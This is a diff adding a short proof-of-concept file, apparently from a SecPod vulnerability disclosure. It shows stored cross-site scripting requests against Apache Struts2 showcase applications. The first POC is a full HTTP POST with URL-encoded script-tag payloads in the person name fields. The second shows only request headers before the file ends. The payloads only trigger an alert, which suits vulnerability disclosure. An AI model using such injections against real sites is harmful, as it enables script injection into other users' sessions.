@@ -1,0 +1,28 @@
+POC 1:
+-----
+Stored XSS 
+
+POST struts2-showcase/person/editPerson.action HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent: struts2-showcase XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+
+Post Data:
+----------
+persons%281%29.name=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript
+%3E&persons%281%29.lastName=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2
+Fscript%3E&method%3Asave=Save+all+persons
+
+
+POC 2:
+-----
+Stored XSS 
+
+POST /struts2-rest-showcase/orders HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent: struts2-rest-showcase XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
